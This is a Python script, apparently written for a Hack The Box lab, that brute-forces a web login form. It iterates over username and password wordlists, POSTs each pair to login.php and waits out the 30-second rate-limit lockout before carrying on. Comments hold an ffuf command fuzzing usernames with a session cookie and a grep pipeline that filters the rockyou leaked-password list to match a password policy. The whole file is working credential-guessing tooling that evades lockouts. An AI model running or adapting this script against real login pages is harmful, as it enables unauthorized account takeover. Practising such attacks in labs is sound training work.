"""import necessary libraries"""
import time
import requests

# ffuf -u http://94.237.58.148:41250/messages.php -X POST -w /tmp/user.txt:USERF \
# -w /tmp/country_codes.txt:FUZZ -H "Origin: http://94.237.58.148:41250" \
# -H "Content-Type: application/x-www-form-urlencoded" \
# -H "Content-Type: application/x-www-form-urlencoded" \
# -H "User-Agent: ffuf proxied to burp" \
# -b "htb_sessid=MGNjMTc1YjljMGYxYjZhODMxYzM5OWUyNjk3NzI2NjE%3D" \
# -d "user=USERF.FUZZ&message=&submit=submit" -fr "Cannot send message to" -x http://127.0.0.1:8080
USERFILE:str = "usernames2-dup.txt"

# grep --binary-files=without-match -E '^[A-Z]' \
# ~/repo/SecLists/Passwords/Leaked-Databases/rockyou.txt \
# | grep '[[:lower:]]' \
# | grep -E '[0-9]$' | grep -E '[@#$]' | grep -E '^.{20,}$'
PASSFILE:str = "grepped3.txt"

# create url using user and password as argument
BASE_URL:str = "http://94.237.56.188:36126/"
URL:str = BASE_URL + "login.php/"

# rate limit blocks for 30 seconds
LOCK_TIME:int = 30

# message that alert us we hit rate limit
LOCK_MESSAGE:str = "Too many login failures"

def send_login_request() -> None:
    """function to send http login request"""

    # define headers here as they don't need to be reloaded every loop
    headers = {
        'Content-Type' : 'application/x-www-form-urlencoded',
        'Referer' : URL,
        # fake user agent presenting as a chromium browser. change as needed
        "User-Agent": 
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 " +
        "(KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36" +
        "pyscript",
    }

    # read password file
    with open(PASSFILE, "r", encoding="utf-8") as passfile:
        for line in passfile:
            # skip commented out line
            if line.startswith("# "):
                continue
            password = line.strip("\n")

            # read username file
            with open(USERFILE, "r", encoding="utf-8") as userfile:
                for userline in userfile:
                    # skip commented out line
                    if userline.startswith("# "):
                        continue
                    username = userline.strip("\n")

                    # prepare POST data
                    data = {
                        'userid': username,
                        'passwd': password,
                        'submit': 'submit',
                        'rememberme': 'rememberme'
                    }

                    # send the request
                    try:
                        res = requests.post(URL, data=data, headers=headers, timeout=30)

                        # handle generic credential error
                        if "Invalid credentials" in res.text:
                            print("[-] Invalid credentials: " +
                                    f"userid:{username} passwd:{password}")

                        # hit rate limit, let's say we have to wait 30 seconds
                        elif LOCK_MESSAGE in res.text:
                            # if you want to save the skipped combination to a file
                            # with open("skip.txt", "a", encoding="utf-8") as file:
                            #     file.write(username + ":" + password + "\n")
                            print(f"\n[!] Hit rate limit in {username}:" +
                                    f"{password}\n[*] sleeping {LOCK_TIME}\n")
                            # do the actual sleep plus 0.5 to be sure
                            time.sleep(LOCK_TIME+0.5)

                        else:
                            # user and password were valid !
                            print(f"\n[+++] Valid credentials: userid:{username} " +
                                    f"passwd:{password} [+++]")
                            # break  # uncomment if you want to stop at the first correct combination

                    # catch errors in the connection
                    except requests.exceptions.RequestException as e:
                        print(f"An error occurred: {e}")

# TODO: research how to proxy script traffic to burp

def main() -> None:
    """main function to execute"""
    send_login_request()

if __name__ == "__main__":
    main()
